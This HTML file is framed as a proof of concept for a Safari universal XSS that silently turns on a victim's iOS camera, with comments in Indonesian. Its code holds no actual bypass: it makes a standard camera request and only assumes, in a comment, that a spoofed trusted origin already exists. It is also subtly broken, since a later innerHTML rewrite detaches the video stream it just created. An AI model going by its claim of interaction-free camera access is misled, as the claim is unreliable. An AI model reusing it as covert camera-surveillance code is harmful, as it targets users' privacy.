<!-- Filename: poc-uxss-camera.html -->
<!DOCTYPE html>
<html>
<head>
  <title>Safari UXSS Auto Camera Trigger</title>
</head>
<body>
  <h2>ğŸ§ª Safari UXSS + Camera Auto Trigger (iOS 17)</h2>

  <script>
    // Simulasi skenario: sudah dalam context spoofed origin (bypass SOP)
    // Karena UXSS bug memungkinkan code attacker dijalankan di context 'trusted'
    (async () => {
      try {
        // Trigger kamera secara langsung tanpa interaksi
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        // Buat elemen video
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;
        video.style.width = '300px';
        document.body.appendChild(video);

        // Tambahkan instruksi untuk memastikan user sadar
        document.body.innerHTML += "<p><b>ğŸ“¸ Kamera telah dibuka otomatis</b> â€” UXSS active.</p>";

      } catch (e) {
        document.body.innerHTML += `<p style='color:red;'>âŒ Kamera gagal diakses: ${e.message}</p>`;
      }
    })();
  </script>
</body>
</html>
